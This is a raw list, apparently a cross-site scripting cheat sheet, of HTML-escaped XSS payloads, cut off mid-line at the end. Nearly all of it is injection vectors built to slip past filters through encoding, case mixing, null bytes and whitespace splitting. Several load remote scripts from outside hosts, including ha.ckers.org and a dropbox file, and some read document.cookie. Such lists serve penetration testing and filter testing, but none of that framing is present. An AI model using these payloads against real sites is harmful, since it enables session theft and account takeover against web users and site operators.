href=\"data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203\"&gt;Click Me&lt;/a&gt;\n\u2018; alert(1);\n\u2018)alert(1);//\n&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;\n&lt;IMG SRC=jAVasCrIPt:alert(\u2018XSS\u2019)&gt;\n&lt;IMG SRC=\u201djavascript:alert(\u2018XSS\u2019);\u201d&gt;\n&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;\n&lt;IMG SRC=javascript:alert(\u2018XSS\u2019)&gt;      \n&lt;img src=xss onerror=alert(1)&gt;\n&lt;iframe %00 src=\"&amp;Tab;javascript:prompt(1)&amp;Tab;\"%00&gt;\n&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;'&lt;iframe/onload=confirm(1)&gt;'\n&lt;input/onmouseover=\"javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;\"\n&lt;sVg&gt;&lt;scRipt %00&gt;alert&amp;lpar;1&amp;rpar; {Opera}\n&lt;img/src=`%00` onerror=this.onerror=confirm(1)\n&lt;form&gt;&lt;isindex formaction=\"javascript&amp;colon;confirm(1)\"\n&lt;img src=`%00`&amp;NewLine; onerror=alert(1)&amp;NewLine;\n&lt;script/&amp;Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&amp;Tab;&gt;&lt;/script&gt;\n&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?\n&lt;iframe/src=\"data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"&gt;\n&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/\n&amp;#34;&amp;#62;&lt;h1/onmouseover='\\u0061lert(1)'&gt;%00\n&lt;iframe/src=\"data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;\"&gt;\n&lt;meta content=\"&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)\" http-equiv=\"refresh\"/&gt;\n&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script\n&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\n&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"&gt;\n&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;\n&lt;form&gt;&lt;a href=\"javascript:\\u0061lert&amp;#x28;1&amp;#x29;\"&gt;X\n&lt;/script&gt;&lt;img/*%00/src=\"worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;\"/%00*/onerror='eval(src)'&gt;\n&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;\n&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=\"javascript&amp;#58;alert(1)\"&amp;#11;&amp;#10;&amp;#09;;&gt;\n&lt;a href=\"data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a\nhttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script\n&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;\"&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;\"&gt;XYZ&lt;/a\n&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt('&amp;#49;')\n&lt;style/onload=prompt&amp;#40;'&amp;#88;&amp;#83;&amp;#83;'&amp;#41;\n&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^\n&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(\n&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;\"date\" onfocus=\"alert(1)\"&gt;\n&lt;form&gt;&lt;textarea &amp;#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;'&gt;\n&lt;script /***/&gt;/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/&lt;/script /***/\n&lt;iframe srcdoc='&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;'&gt;\n&lt;a href=\"javascript:void(0)\" onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;\n&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;\n&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;\n&lt;///style///&gt;&lt;span %2F onmousemove='alert&amp;lpar;1&amp;rpar;'&gt;SPAN\n&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&amp;Tab;prompt(1)\n&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;'&lt;body/onload=confirm(1)&gt;'\n&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}\n&lt;marquee onstart='javascript:alert&amp;#x28;1&amp;#x29;'&gt;^__^\n&lt;div/style=\"width:expression(confirm(1))\"&gt;X&lt;/div&gt; {IE7}\n&lt;iframe/%00/ src=javaSCRIPT&amp;colon;alert(1)\n//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type='submit'&gt;//\n/*iframe/src*/&lt;iframe/src=\"&lt;iframe/src=@\"/onload=prompt(1) /*iframe/src*/&gt;\n//|\\\\ &lt;script //|\\\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\\\ &lt;/script //|\\\\\n&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;\n&lt;a/href=\"javascript:&amp;#13; javascript:prompt(1)\"&gt;&lt;input type=\"X\"&gt;\n&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)\n&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&amp;#x28;1&amp;#x29; {Opera}\n&lt;a href=\"javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;\"&gt;&lt;button&gt;\n&lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;\n&lt;iframe style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\"&gt;\n&lt;a href=\"jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;\"&gt;X&lt;/a&gt;\n&lt;embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;var onmouseover=\"prompt(1)\"&gt;On Mouse Over&lt;/var&gt;\n&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;\n&lt;img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"&gt;\n&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;\n&lt;script src=\"data:text/javascript,alert(1)\"&gt;&lt;/script&gt;\n&lt;iframe/src \\/\\/onload = prompt(1)\n&lt;iframe/onreadystatechange=alert(1)\n&lt;svg/onload=alert(1)\n&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)\n&lt;input type=\"text\" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;\nhttp://www.&lt;script&gt;alert(1)&lt;/script .com\n&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;svg&gt;&lt;script ?&gt;alert(1)\n&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;img src=`xx:xx`onerror=alert(1)&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;javascript&amp;colon;alert(1)\"/&gt;\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always&gt;\n&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1\n&lt;a href=\"data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\"&gt;X&lt;/a\n&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE&gt;\n&lt;script&gt;~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')&lt;/script U+\n&lt;script/src=\"data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"&gt;&lt;/script a=\\u0061 &amp; /=%2F\n&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script\n&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\n&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;\n&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;\n&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script\n&lt;img src ?itworksonchrome?\\/onerror = alert(1)\n&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;\n&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)\n&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe\n&lt;script x&gt; alert(1) &lt;/script 1=2\n&lt;div/onmouseover='alert(1)'&gt; style=\"x:\"&gt;\n&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;\n &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;\n&lt;div style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\"&gt;x&lt;/button&gt;\n\"&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;\n&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;\n&lt;iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"&gt;&lt;/iframe&gt;\n&lt;a href=\"data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203\"&gt;Click Me&lt;/a&gt;\n&lt;SCRIPT&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)&lt;/SCRIPT&gt;\n\u2018;alert(String.fromCharCode(88,83,83))//\u2019;alert(String.fromCharCode(88,83,83))//\u201d;alert(String.fromCharCode(88,83,83))//\u201d;alert(String.fromCharCode(88,83,83))//\u2013&gt;&lt;/SCRIPT&gt;\u201d&gt;\u2019&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n&lt;IMG \u201c\u201d\u201d&gt;&lt;SCRIPT&gt;alert(\u201cXSS\u201d)&lt;/SCRIPT&gt;\u201d&gt;\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n&lt;IMG SRC=\u201djav ascript:alert(\u2018XSS\u2019);\u201d&gt;\n&lt;IMG SRC=\u201djav&amp;#x09;ascript:alert(\u2018XSS\u2019);\u201d&gt;\n&lt;&lt;SCRIPT&gt;alert(\u201cXSS\u201d);//&lt;&lt;/SCRIPT&gt;\n%253cscript%253ealert(1)%253c/script%253e\n\u201c&gt;&lt;s\u201d%2b\u201dcript&gt;alert(document.cookie)&lt;/script&gt;\nfoo&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;\n&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;\n&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;\n&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;BODY BACKGROUND=\u201djavascript:alert(\u2018XSS\u2019)\u201d&gt;\n&lt;BODY ONLOAD=alert(\u2018XSS\u2019)&gt;\n&lt;INPUT TYPE=\u201dIMAGE\u201d SRC=\u201djavascript:alert(\u2018XSS\u2019);\u201d&gt;\n&lt;IMG SRC=\u201djavascript:alert(\u2018XSS\u2019)\u201d\n&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\njavascript:alert(\"hellox worldss\")\n&lt;img src=\"javascript:alert('XSS');\"&gt;\n&lt;img src=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;\n&lt;\"';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;\n&lt;SCRIPT a=\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;\" '' SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT \"a='&gt;'\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;\n&lt;\"';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;?/SCRIPT&gt;&amp;submit.x=27&amp;submit.y=9&amp;cmd=search\n&lt;script&gt;alert(\"hellox worldss\")&lt;/script&gt;&amp;safe=high&amp;cx=006665157904466893121:su_tzknyxug&amp;cof=FORID:9#510\n&lt;script&gt;alert(\"XSS\");&lt;/script&gt;&amp;search=1\n0&amp;q=';alert(String.fromCharCode(88,83,83))//\\';alert%2?8String.fromCharCode(88,83,83))//\";alert(String.fromCharCode?(88,83,83))//\\\";alert(String.fromCharCode(88,83,83)%?29//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83%?2C83))&lt;/SCRIPT&gt;&amp;submit-frmGoogleWeb=Web+Search\n&lt;h1&gt;&lt;font color=blue&gt;hellox worldss&lt;/h1&gt;\n&lt;BODY ONLOAD=alert('hellox worldss')&gt;\n&lt;input onfocus=write(XSS) autofocus&gt;\n&lt;input onblur=write(XSS) autofocus&gt;&lt;input autofocus&gt;\n&lt;body onscroll=alert(XSS)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;\n&lt;form&gt;&lt;button formaction=\"javascript:alert(XSS)\"&gt;lol\n&lt;!--&lt;img src=\"--&gt;&lt;img src=x onerror=alert(XSS)//\"&gt;\n&lt;![&gt;&lt;img src=\"]&gt;&lt;img src=x onerror=alert(XSS)//\"&gt;\n&lt;style&gt;&lt;img src=\"&lt;/style&gt;&lt;img src=x onerror=alert(XSS)//\"&gt;\n&lt;? foo=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;! foo=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;/ foo=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;? foo=\"&gt;&lt;x foo='?&gt;&lt;script&gt;alert(1)&lt;/script&gt;'&gt;\"&gt;\n&lt;! foo=\"[[[Inception]]\"&gt;&lt;x foo=\"]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;% foo&gt;&lt;x foo=\"%&gt;&lt;script&gt;alert(123)&lt;/script&gt;\"&gt;\n&lt;div style=\"font-family:'foo&amp;#10;;color:red;';\"&gt;LOL\nLOL&lt;style&gt;*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}&lt;/style&gt;\n&lt;script&gt;({0:#0=alert/#0#/#0#(0)})&lt;/script&gt;\n&lt;svg xmlns=\"http://www.w3.org/2000/svg\"&gt;LOL&lt;script&gt;alert(123)&lt;/script&gt;&lt;/svg&gt;\n&amp;lt;SCRIPT&amp;gt;alert(/XSS/&amp;#46;source)&amp;lt;/SCRIPT&amp;gt;\n\\\\\";alert('XSS');//\n&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\\\"XSS\\\");&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;INPUT TYPE=\\\"IMAGE\\\" SRC=\\\"javascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;BODY BACKGROUND=\\\"javascript&amp;#058;alert('XSS')\\\"&amp;gt;\n&amp;lt;BODY ONLOAD=alert('XSS')&amp;gt;\n&amp;lt;IMG DYNSRC=\\\"javascript&amp;#058;alert('XSS')\\\"&amp;gt;\n&amp;lt;IMG LOWSRC=\\\"javascript&amp;#058;alert('XSS')\\\"&amp;gt;\n&amp;lt;BGSOUND SRC=\\\"javascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;BR SIZE=\\\"&amp;{alert('XSS')}\\\"&amp;gt;\n&amp;lt;LAYER SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\\\"&amp;gt;&amp;lt;/LAYER&amp;gt;\n&amp;lt;LINK REL=\\\"stylesheet\\\" HREF=\\\"javascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;LINK REL=\\\"stylesheet\\\" HREF=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css\\\"&amp;gt;\n&amp;lt;STYLE&amp;gt;@import'http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css';&amp;lt;/STYLE&amp;gt;\n&amp;lt;META HTTP-EQUIV=\\\"Link\\\" Content=\\\"&amp;lt;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css&amp;gt;; REL=stylesheet\\\"&amp;gt;\n&amp;lt;STYLE&amp;gt;BODY{-moz-binding&amp;#58;url(\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xssmoz&amp;#46;xml#xss\\\")}&amp;lt;/STYLE&amp;gt;\n&amp;lt;XSS STYLE=\\\"behavior&amp;#58; url(xss&amp;#46;htc);\\\"&amp;gt;\n&amp;lt;STYLE&amp;gt;li {list-style-image&amp;#58; url(\\\"javascript&amp;#058;alert('XSS')\\\");}&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS\n&amp;lt;IMG SRC='vbscript&amp;#058;msgbox(\\\"XSS\\\")'&amp;gt;\n&amp;lt;IMG SRC=\\\"mocha&amp;#58;&amp;#91;code&amp;#93;\\\"&amp;gt;\n&amp;lt;IMG SRC=\\\"livescript&amp;#058;&amp;#91;code&amp;#93;\\\"&amp;gt;\n\u017escriptualert(EXSSE)\u017e/scriptu\n&amp;lt;META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=data&amp;#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\"&amp;gt;\n&amp;lt;META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http&amp;#58;//;URL=javascript&amp;#058;alert('XSS');\\\"\n&amp;lt;IFRAME SRC=\\\"javascript&amp;#058;alert('XSS');\\\"&amp;gt;&amp;lt;/IFRAME&amp;gt;\n&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=\\\"javascript&amp;#058;alert('XSS');\\\"&amp;gt;&amp;lt;/FRAMESET&amp;gt;\n&amp;lt;TABLE BACKGROUND=\\\"javascript&amp;#058;alert('XSS')\\\"&amp;gt;\n&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=\\\"javascript&amp;#058;alert('XSS')\\\"&amp;gt;\n&amp;lt;DIV STYLE=\\\"background-image&amp;#58; url(javascript&amp;#058;alert('XSS'))\\\"&amp;gt;\n&amp;lt;DIV STYLE=\\\"background-image&amp;#58;\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028&amp;#46;1027\\0058&amp;#46;1053\\0053\\0027\\0029'\\0029\\\"&amp;gt;\n&amp;lt;DIV STYLE=\\\"background-image&amp;#58; url(javascript&amp;#058;alert('XSS'))\\\"&amp;gt;\n&amp;lt;DIV STYLE=\\\"width&amp;#58; expression(alert('XSS'));\\\"&amp;gt;\n&amp;lt;STYLE&amp;gt;@im\\port'\\ja\\vasc\\ript&amp;#58;alert(\\\"XSS\\\")';&amp;lt;/STYLE&amp;gt;\n&amp;lt;IMG STYLE=\\\"xss&amp;#58;expr/*XSS*/ession(alert('XSS'))\\\"&amp;gt;\n&amp;lt;XSS STYLE=\\\"xss&amp;#58;expression(alert('XSS'))\\\"&amp;gt;\nexp/*&amp;lt;A 